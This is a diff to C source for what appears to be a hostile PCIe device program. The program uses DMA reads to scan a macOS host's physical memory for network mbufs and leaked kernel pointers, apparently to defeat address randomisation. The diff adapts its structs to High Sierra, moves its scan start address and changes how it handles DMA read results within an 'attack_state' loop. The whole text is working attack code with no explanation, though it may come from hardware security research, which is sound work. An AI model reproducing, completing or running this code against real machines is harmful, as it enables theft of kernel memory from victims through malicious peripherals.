@@ -38,7 +38,7 @@
 
 #include "mask.h"
 #include "macos-mbuf-manipulation.h"
-#include "macos-stub-mbuf.h"
+#include "macos-stub-mbuf-high-sierra.h"
 #include "crhexdump.h"
 #include "pcie.h"
 #include "pcie-backend.h"
@@ -159,25 +159,17 @@ is_probably_mbuf(const struct mbuf *mbuf)
 	 * length value set, for example. However, if we're scanning all of
 	 * memory, we can't afford to detect empties as mbufs.
 	 */
-	return ((mbuf->m_next & 0xFF) == 0) &&
+	return ((mbuf->MM_NEXT & 0xFF) == 0) &&
 		/*
 		((mbuf->m_next & 0xffffff0000000000ll) == 0xffffff0000000000ll) &&
 		((mbuf->m_nextpkt & 0xffffff0000000000ll) == 0xffffff0000000000ll) &&
 		((mbuf->m_data & 0xffffff0000000000ll) == 0xffffff0000000000ll) &&
 		*/
-		((mbuf->m_nextpkt & 0xFF) == 0) &&
-		(mbuf->m_type <= MT_MAX) &&
-		(mbuf->m_len >= 0) && (mbuf->m_len <= 16384); /* &&
+		((mbuf->MM_NEXTPKT & 0xFF) == 0) &&
+		(mbuf->MM_TYPE <= MT_MAX) &&
+		(mbuf->MM_LEN >= 0) && (mbuf->MM_LEN <= 16384); /* &&
 		!(mbuf->m_next == 0 && mbuf->m_nextpkt == 0 && mbuf->m_data == 0); */
 }
-
-uint8_t *
-mbuf_data_pointer(const struct mbuf *mbuf)
-{
-	return (uint8_t *)(((uint64_t)(mbuf) & ~uint64_mask(12))
-		| ((uint64_t)mbuf->m_data & uint64_mask(12)));
-}
-
 
 static inline uint64_t
 get_page_address(uint64_t address)
@@ -318,9 +310,8 @@ respond_to_packet(struct packet_response_state *state,
 int
 main(int argc, char *argv[])
 {
-	bool all_mbufs, ring_plausible;
+	bool all_mbufs;
 	int i, send_result, read_result;
-	TLPQuadWord tlp_in_quadword[32];
 	TLPQuadWord tlp_out_header[2];
 	TLPQuadWord tlp_out_data[16];
 	struct RawTLP raw_tlp_in;
@@ -330,9 +321,11 @@ main(int argc, char *argv[])
 
 	enum packet_response response;
 	struct packet_response_state packet_response_state;
-	packet_response_state.outer_loop = AS_LINEAR_SCAN_FOR_MBUF;
+	packet_response_state.outer_loop = AS_LOOKING_FOR_LEAKED_SYMBOL;
 	packet_response_state.attack_state = AS_UNINITIALISED;
-	uint64_t read_addr, next_read_addr = 0x000000;
+	uint64_t read_addr;/* next_read_addr = 0x000000; */
+	uint64_t next_read_addr = 0x3b0000000;
+
 	/*uint64_t read_addr, next_read_addr = 0x800000;*/
 	/*
 	 * We have found that in practise the tx ring is not located lower
@@ -341,22 +334,17 @@ main(int argc, char *argv[])
 	struct bcm5701_send_buffer_descriptor *descriptor;
 	struct bcm5701_send_buffer_descriptor descriptors[16];
 	uint64_t candidate_symbols[32];
-	uint8_t read_buffer[512];
 	struct mbuf mbuf;
 	struct mbuf mbuf_page[MBUFS_PER_PAGE];
 
-	uint16_t length;
 	uint64_t descriptor_index, host_address, last_page_address;
-	uint64_t mbuf_index, mbuf_data_address, m_next_value, mbuf_page_address;
-	uint8_t *mbuf_data;
+	uint64_t mbuf_index, mbuf_page_address;
 
 	int init = pcie_hardware_init(argc, argv, &physmem);
 	if (init) {
 		puts("Problem initialising PCIE core.");
 		return init;
 	}
-
-	uint64_t addr, req_addr;
 
 	drain_pcie_core();
 	puts("PCIe Core Drained. Let's go.");
@@ -399,20 +387,19 @@ main(int argc, char *argv[])
 			printf("NIC probe result: %d.\n", send_result);
 			break;
 		case AS_LOOKING_FOR_LEAKED_SYMBOL:
-			if ((next_read_addr & 0xFFFFF) == 0) {
-				putchar('.');
+			if ((next_read_addr & 0xFFFFFF) == 0) {
+				printf("0x%lx.\n", next_read_addr);
 				fflush(NULL);
 			}
 			read_result = perform_dma_read((uint8_t *)candidate_symbols,
 				256, packet_response_state.devfn, 0, next_read_addr);
 			read_addr = next_read_addr;
-			if (read_result == -1) {
+			if (read_result == DRR_SUCCESS) {
+				next_read_addr += 256;
+			} else {
 				next_read_addr += 4096;
 				continue;
-			} else {
-				next_read_addr += 256;
 			}
-
 			for (i = 0; i < 32; ++i) {
 				candidate_symbols[i] = bswap64(candidate_symbols[i]);
 				/*if ((candidate_symbols[i] & 0xfffff) == 0x283c0) {*/
@@ -422,8 +409,8 @@ main(int argc, char *argv[])
 				/*printf("Slide: 0x%lx.\n", candidate_symbols[i] -*/
 				/*0xffffff8000b283c0l);*/
 				/*}*/
-				if ((candidate_symbols[i] & 0xFFFFFFFFFF000000) ==
-					0xFFFFFF8000000000) {
+				if ((candidate_symbols[i] & 0xFFFFFFF000000000) ==
+					                        0xFFFFFF8000000000) {
 					printf("\nFound symbol.\n");
 					printf("At address 0x%lx.\n", read_addr +
 						i * sizeof(uint64_t));
